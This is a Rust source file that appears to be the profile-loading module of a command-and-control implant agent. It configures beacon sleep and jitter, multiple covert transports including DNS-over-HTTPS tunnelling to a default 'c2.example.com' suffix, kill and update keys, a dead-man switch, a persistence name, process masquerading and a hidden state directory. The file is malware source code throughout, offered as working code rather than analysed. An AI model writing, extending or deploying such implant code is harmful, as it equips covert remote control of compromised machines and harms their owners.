use serde::{Deserialize, Serialize};
use std::path::Path;

/// One transport endpoint.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct TransportCfg {
    #[serde(default)]
    pub kind: String,
    #[serde(default)]
    pub host: String,
    #[serde(default)]
    pub port: u16,
    #[serde(default)]
    pub path: String,
    #[serde(default)]
    pub sni: String,
    #[serde(default)]
    pub suffix: String,
    #[serde(default)]
    pub tls_insecure: bool,
    #[serde(default)]
    pub pin_sha256: String,
    #[serde(default)]
    pub timeout_secs: u64,
}

/// Agent profile (generated by c2builder; example values only).
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct Profile {
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub client_id: String,
    #[serde(default)]
    pub transport: String,
    #[serde(default)]
    pub transports: Vec<TransportCfg>,
    #[serde(default)]
    pub psk_b64: String,
    #[serde(default)]
    pub sleep: u32,
    #[serde(default)]
    pub jitter: u32,
    #[serde(default)]
    pub kill_key_b64: String,
    #[serde(default)]
    pub update_key_b64: String,
    #[serde(default)]
    pub deadman_secs: u32,
    #[serde(default)]
    pub deadman_action: String,
    #[serde(default)]
    pub persist_name: String,
    #[serde(default)]
    pub masquerade: String,
    #[serde(default)]
    pub caps: Vec<String>,
    #[serde(default)]
    pub update_dir: String,
}

const EMBEDDED: &str = include_str!(concat!(env!("OUT_DIR"), "/profile.json"));

impl Profile {
    /// Load a profile from disk, or the build-time embedded one.
    pub fn load(path: Option<&str>) -> Result<Self, String> {
        let text = match path {
            Some(p) if !p.is_empty() => {
                std::fs::read_to_string(p).map_err(|e| format!("read profile {}: {}", p, e))?
            }
            _ => EMBEDDED.to_string(),
        };
        let mut p: Profile = serde_json::from_str(&text).map_err(|e| format!("parse profile: {}", e))?;
        p.normalize();
        Ok(p)
    }

    pub fn normalize(&mut self) {
        if self.sleep == 0 {
            self.sleep = 60;
        }
        if self.jitter > 90 {
            self.jitter = 90;
        }
        if self.client_id.is_empty() {
            self.client_id = format!("{}-{}", crate::platform::hostname(), crate::wire::rand_hex(4));
        }
        if self.transports.is_empty() && !self.transport.is_empty() {
            let (kind, host, port) = parse_endpoint(&self.transport);
            if !host.is_empty() {
                self.transports.push(TransportCfg {
                    kind,
                    host,
                    port,
                    path: if self.transport.contains("/ws") { "/ws".into() } else { String::new() },
                    ..Default::default()
                });
            }
        }
        for t in &mut self.transports {
            if t.timeout_secs == 0 {
                t.timeout_secs = 15;
            }
            if t.path.is_empty() {
                t.path = match t.kind.as_str() {
                    "doh" => "/doh".to_string(),
                    "ws" | "wss" => "/ws".to_string(),
                    _ => String::new(),
                };
            }
            if t.suffix.is_empty() {
                t.suffix = "c2.example.com".to_string();
            }
        }
        if self.update_dir.is_empty() {
            self.update_dir = default_state_dir().join("updates").to_string_lossy().to_string();
        }
    }

    pub fn caps(&self) -> Vec<String> {
        if !self.caps.is_empty() {
            return self.caps.clone();
        }
        crate::modules::CAPS.iter().map(|s| s.to_string()).collect()
    }
}

fn parse_endpoint(s: &str) -> (String, String, u16) {
    // Accept tls://host:port, wss://host:port/ws, udp://host:port ...
    let (scheme, rest) = match s.split_once("://") {
        Some((a, b)) => (a.to_string(), b.to_string()),
        None => ("tls".to_string(), s.to_string()),
    };
    let hostport = rest.split('/').next().unwrap_or("").to_string();
    let (host, port) = match hostport.rsplit_once(':') {
        Some((h, p)) => (h.to_string(), p.parse().unwrap_or(default_port(&scheme))),
        None => (hostport, default_port(&scheme)),
    };
    (scheme, host, port)
}

fn default_port(kind: &str) -> u16 {
    match kind {
        "udp" | "dns" => 9445,
        "doh" => 443,
        "ws" => 80,
        _ => 443,
    }
}

pub fn default_state_dir() -> std::path::PathBuf {
    if cfg!(windows) {
        if let Ok(p) = std::env::var("ProgramData") {
            return Path::new(&p).join("C2V2");
        }
    }
    if let Ok(h) = std::env::var("HOME") {
        return Path::new(&h).join(".local/share/c2v2");
    }
    Path::new(".").to_path_buf()
}

/// State dir with a dot-prefixed name on unix (hidden), ProgramData on windows.
pub fn state_dir() -> std::path::PathBuf {
    let d = if cfg!(windows) {
        default_state_dir()
    } else {
        default_state_dir()
    };
    let _ = std::fs::create_dir_all(&d);
    d
}
